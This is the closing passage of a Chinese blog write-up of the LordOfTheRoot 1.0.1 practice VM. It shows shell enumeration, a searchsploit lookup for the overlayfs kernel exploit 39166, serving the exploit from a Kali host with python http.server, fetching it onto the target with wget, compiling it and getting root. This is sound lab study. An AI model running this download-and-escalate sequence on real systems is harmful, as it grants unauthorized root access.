+                            |_______ \_______  /____|    |____|_  /
+                                    \/       \/                 \/
+ __      __       .__                                ___________      .__                   .___
+/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
+\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ |
+ \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ |
+  \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  \___  /   |__|  |__|\___  &gt;___|  /\____ |
+       \/       \/          \/            \/     \/       \/                  \/     \/      \/
+Last login: Tue Sep 22 12:59:38 2015 from 192.168.55.135
+smeagol@LordOfTheRoot:~$ whoami
+smeagol
+smeagol@LordOfTheRoot:~$ id
+uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
+smeagol@LordOfTheRoot:~$ uname -a
+Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
+smeagol@LordOfTheRoot:~$ id
+uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
+smeagol@LordOfTheRoot:~$
+</code></pre>
+<p>系统是</p>
+<pre><code>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
+</code></pre>
+<p>可以搜搜有没有提权的,我想的是ubuntu内核提权，但是今天累了不想写了，明天继续(bushi)</p>
+<p>ok魂斗罗归来</p>
+<p>搜了一下有一个39166.c的，上exploitsearch找了一下
+复制到kali</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ searchsploit 39166
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &#39;overlayfs&#39; Local | linux/local/39166.c
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>用python启一个服务器，从服务器下载39166.c</p>
+<pre><code>┌──(root㉿kali)-[/home/kali]
+└─# python -m http.server 5555
+Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
+192.168.159.135 - - [10/Jul/2024 16:20:28] &quot;GET /39166.c HTTP/1.1&quot; 200 -
+</code></pre>
+<p>编译成可执行文件直接运行，提权成功</p>
+<pre><code>smeagol@LordOfTheRoot:~$ wget 192.168.159.129:5555/39166.c
+--2024-06-30 06:35:11--  http://192.168.159.129:5555/39166.c
+Connecting to 192.168.159.129:5555... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2680 (2.6K) [text/x-csrc]
+Saving to: ‘39166.c’
+
+100%[====================================================&gt;] 2,680       --.-K/s   in 0s
+
+2024-06-30 06:35:11 (123 MB/s) - ‘39166.c’ saved [2680/2680]
+
+smeagol@LordOfTheRoot:~$ ls
+39166.c  Documents  examples.desktop  Pictures  Templates
+Desktop  Downloads  Music             Public    Videos
+smeagol@LordOfTheRoot:~$ gcc 39166.c -o shell
+smeagol@LordOfTheRoot:~$ ls
+39166.c  Documents  examples.desktop  Pictures  shell      Videos
+Desktop  Downloads  Music             Public    Templates
+smeagol@LordOfTheRoot:~$ ./shell
+root@LordOfTheRoot:~#
+</code></pre>
+<p>说是还有个缓冲区溢出的，但是我没看懂。。。。</p>
+<p><a href="https://blog.csdn.net/qq_34801745/article/details/103792018">LordOfTheRoot_1.0.1</a></p>
+<p>等我后面学了再回来</p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
